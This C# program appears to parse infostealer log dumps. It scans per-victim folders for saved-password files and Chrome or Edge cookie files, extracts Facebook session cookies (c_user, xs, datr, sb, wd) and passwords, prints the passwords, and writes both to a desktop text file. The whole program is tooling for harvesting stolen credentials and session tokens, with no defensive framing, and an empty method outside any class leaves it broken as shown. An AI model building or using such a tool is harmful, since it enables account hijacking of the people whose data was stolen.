using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace write_cookie_final
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {


                string path = @"C:\Users\ADMIN\Desktop\log 2400";
                string[] list_forlder = getAllFolder(path);
                // lấy tất cả các file trong forlder
                foreach (String name_forlder in list_forlder)
                {

                    List<string> list_file = getAllFile(name_forlder);
                    List<string> list_pass = new List<string>();
                    Dictionary<string, List<string>> list_cookie = new Dictionary<string, List<string>>();
                    Cookie_entity cookie_Entity = new Cookie_entity();
                    cookie_Entity.setPath(name_forlder);
                    foreach (string name_list in list_file)
                    {

                        if (name_list.Contains("passwords.txt") || name_list.Contains("Passwords.txt"))
                        {
                            list_pass = getPassword(name_list);
                            cookie_Entity.setPass(list_pass);
                        }
                        else
                        {
                            list_cookie = readInforCookie(list_file);
                            cookie_Entity.setListValue(list_cookie);
                        }
                    }
                    if (cookie_Entity.getListValue()?.Any() ?? false)
                    {
                        writeToFile(cookie_Entity);
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("co loi !!!! {0}", e);
            }
            Console.WriteLine("ket thuc chuong trinh");
            Console.ReadKey();
        }


        public static string[] getAllFolder(string path)
        {
            string[] folders = Directory.GetDirectories(path, "*", SearchOption.TopDirectoryOnly);
            return folders;
        }


        public static List<String> getAllFile(string path_test)
        {
            List<string> list_file_select = new List<string>();
            IDictionary<string, string> new_dict = new Dictionary<string, string>();
            string[] chilf_dict = System.IO.Directory.GetFiles(@path_test, "*", System.IO.SearchOption.AllDirectories);
            IDictionary<string, string> key_value = new Dictionary<string, string>();
            foreach (string str in chilf_dict)
            {

                if (str.Contains("passwords.txt") || str.Contains("Passwords.txt"))
                {
                    list_file_select.Add(str);
                }
                if (str.Contains("Cookies"))
                {
                    if (str.Contains("Google Chrome") || str.Contains("Microsoft Edge") || str.Contains("Microsoft_[Edge]") || str.Contains("Google_[Chrome]"))
                    {
                        list_file_select.Add(str);
                    }
                }
            }
            return list_file_select;
        }
        public static Dictionary<string, List<string>> readInforCookie(List<String> list_name_file)
        {
            Dictionary<string, List<string>> key_code = new Dictionary<string, List<string>>();
            String[] str_key = {"c_user", "xs", "wd", "datr", "sb" };
            foreach (string path in list_name_file)
            {
                using (StreamReader sr = new StreamReader(path))
                {
                    string line;
                    int demo = 0;
                    while ((line = sr.ReadLine()) != null)
                    {
                        if (line.Contains("facebook.com"))
                        {
                            foreach (string key in str_key)
                            {
                                if (line.Contains(key))
                                {
                                    string code = line.Substring(line.IndexOf(key) + key.Length);
                                    demo++;
                                    string text = code.Replace(" ", string.Empty);
                                    if (key_code.Keys.Contains(key))
                                    {
                                        if (!key_code[key].Contains(text))
                                        {
                                            key_code[key].Add(text);
                                        }
                                        // key_code.Values.Add(code);
                                    }
                                    else
                                    {
                                        List<string> list_value = new List<string>();
                                        list_value.Add(text);
                                        key_code.Add(key, list_value);

                                    }



                                    //key_code.Add(key, code);
                                }
                            }
                        }
                    }
                }
            }
            return key_code;
        }
        public static List<string> getPassword(string path)
        {
            List<string> list_password = new List<string>();
            String[] str_key = { "Password: ", "password: " };
            using (StreamReader sr = new StreamReader(path))
            {
                string line;
                int demo = 0;
                while ((line = sr.ReadLine()) != null)
                {
                    foreach (string key in str_key)
                    {
                        if (line.Contains(key))
                        {
                            string code = line.Substring(line.IndexOf(key) + key.Length);
                            demo++;
                            // dict.Add(key, code);
                            Console.WriteLine("**********************");
                            Console.WriteLine("{0}={1}", key, code);
                            if (list_password.Count != 0)
                            {
                                if (!list_password.Contains(code))
                                {
                                    list_password.Add(code);
                                }
                            }
                            else
                            {
                                list_password.Add(code);
                            }
                        }
                    }
                }
            }

            return list_password;
        }
        public static void writeToFile(Cookie_entity cookie_Entity)
        {
            TextWriter tsw = new StreamWriter(@"C:\Users\ADMIN\Desktop\demo.txt", true);
            tsw.WriteLine(cookie_Entity.getPath());
            if (cookie_Entity.getListValue()?.Any() ?? false)
            {
                foreach (KeyValuePair<string, List<string>> cookie in cookie_Entity.getListValue())
                {
                    foreach (string item in cookie.Value)
                    {
                        tsw.Write(cookie.Key + '=' + item);
                        tsw.WriteLine("");
                    }

                }
            }
            else
            {
                tsw.WriteLine("k co cookie");
            }

            tsw.WriteLine("");

            if (cookie_Entity.getPass()?.Any() ?? false)
            {


                foreach (string str in cookie_Entity.getPass())
                {
                    tsw.WriteLine(str);
                }
            }
            else
            {
                tsw.WriteLine("k co file password");
            }
            tsw.WriteLine("********************************************************************");
            tsw.Close();
        }
    }

    public void login()
    {

    }
    
}
